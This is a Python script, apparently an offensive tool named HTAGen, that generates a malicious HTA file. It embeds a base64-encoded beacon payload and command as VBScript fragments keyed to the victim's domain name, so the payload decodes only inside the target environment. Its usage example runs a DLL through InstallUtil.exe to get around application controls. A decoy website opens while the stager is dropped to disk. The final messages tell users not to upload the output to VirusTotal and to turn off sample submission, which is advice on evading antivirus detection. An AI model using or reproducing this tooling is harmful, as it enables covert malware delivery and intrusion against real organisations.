import sys
import random
import string
import base64
import os
import argparse


def random_char(y):
	return ''.join(random.choice(string.ascii_letters) for x in range(y))

def genstr(domainname, malstr):
	checkcode = """If Mid(b,BBBBBBB,1) = "XXXXXXXX" Then
c=c&"YYYYYYY"
End If
"""
	ctr = 0
	ctrnew = 0

	count = 0
	outstr = ""
	while(ctrnew < len(malstr)):
		ran = random.randrange(5)
		ctrnew = ctr + 2 + ran
		for i in range(0,26):
			if(chr(i+65) == domainname[count%len(domainname)]):
				outstr = outstr + (checkcode.replace("XXXXXXXX",chr(i+65)).replace("YYYYYYY",malstr[ctr:ctrnew]).replace("BBBBBBB",str(count +1)).replace("AAAAAAAAAAAAAAAAAAAAAAAA",random_char(5)).replace("OOOOOOOOOOOOO",random_char(128)))
			else:
				outstr = outstr +(checkcode.replace("XXXXXXXX",chr(i+65)).replace("YYYYYYY",random_char(2+ran)).replace("BBBBBBB",str(count +1)).replace("AAAAAAAAAAAAAAAAAAAAAAAA",random_char(5)).replace("OOOOOOOOOOOOO",random_char(128)))
		ctr = ctrnew
		count = count+1
	return outstr

def genstr2(domainname, malstr):
	checkcode = """If Mid(b,BBBBBBB,1) = "XXXXXXXX" Then
contents=contents&"YYYYYYY"
End If
"""
	ctr = 0
	ctrnew = 0

	count = 0
	outstr = ""
	while(ctrnew < len(malstr)):
		ran = random.randrange(100000)
		ctrnew = ctr + 10000 + ran
		for i in range(0,26):
			if(chr(i+65) == domainname[count%len(domainname)]):
				outstr = outstr +(checkcode.replace("XXXXXXXX",chr(i+65)).replace("YYYYYYY",malstr[ctr:ctrnew]).replace("BBBBBBB",str(count +1)))
			else:
				outstr = outstr +(checkcode.replace("XXXXXXXX",chr(i+65)).replace("YYYYYYY",random_char(10000+ran)).replace("BBBBBBB",str(count +1)))
		ctr = ctrnew
		count = count+1
	return outstr




if __name__ == '__main__':
	print("Example:  python.exe HTAGen.py -b test.dll -d test.dll -c \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U test.dll\" -w https://google.com -D JANKH -t")	
	parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
									"try to relay that connection to specified target(s) system or the original client")
	parser._optionals.title = "Main options"
	parser = argparse.ArgumentParser()
	parser.add_argument("-d","--drop",  type=str, required=False, help='Stager filename for HTA to drop to disk')
	parser.add_argument("-b","--beacon",  type=str, required=True, help='Beacon file to load')
	parser.add_argument("-w","--website",  type=str, required=True, help='Website to open')
	parser.add_argument("-t","--test",  required=False, help='Makes the HTA visibile for debugging', action="store_true")
	parser.add_argument("-c","--command",  type=str, required=False, help='Command for HTA to run')
	parser.add_argument("-D","--domain",  type=str, required=True, help='Domain name, all capital letters, and remove special characters')
	args = parser.parse_args()
	print("Loading beacon from:", args.beacon)
	print("File to be dropped to disk:", args.drop)
	print("Command to be executed:", args.command)
	print("Domain name to use for encryption key:", args.domain)
	f = open("Start.hta", "r")
	DropPath = args.drop
	BeaconPath = args.beacon
	Command = args.command
	URL =  args.website
	DomainName = args.domain
	strfile = f.read()
	strfile = strfile.replace("OUTPUTFILENAMEOUTPUTFILENAME",DropPath)
	if(args.test):
		strfile = strfile.replace("PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP","yes")
		strfile = strfile.replace("OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO","msgbox Base64Decode(c)")
	else:
		strfile = strfile.replace("PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP","no")
		strfile = strfile.replace("OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO","")
	g = open(BeaconPath, "r")
	malfile = g.read()
	strfile = strfile.replace("OBFUSCATEDFILEDROPPEROBFUSCATEDFILEDROPPER", genstr2(DomainName,(base64.b64encode(malfile.encode('ascii'))).decode('ascii')))
	strfile = strfile.replace("OBFUSCATEDCOMMANDOBFUSCATEDCOMMAND",genstr(DomainName,(base64.b64encode(Command.encode('ascii'))).decode('ascii')))
	strfile = strfile.replace("WEBSITETOOPENWEBSITETOOPEN",URL)

	f = open("Out.hta", "w")
	f.write(strfile)
	print(" _   _ _____ ___  _____ _____ _   _ \n| | | |_   _/ _ \\|  __ \\  ___| \\ | |\n| |_| | | |/ /_\\ \\ |  \\/ |__ |  \\| |\n|  _  | | ||  _  | | __|  __|| . ` |\n| | | | | || | | | |_\\ \\ |___| |\\  |\n\\_| |_/ \\_/\\_| |_/\\____|____/\\_| \\_/\n                                    \n                                    ")
	print("File has been written to Out.hta")
	print("Please don't upload to VirusTotal :)")
	print("And check that sample submission is off :)")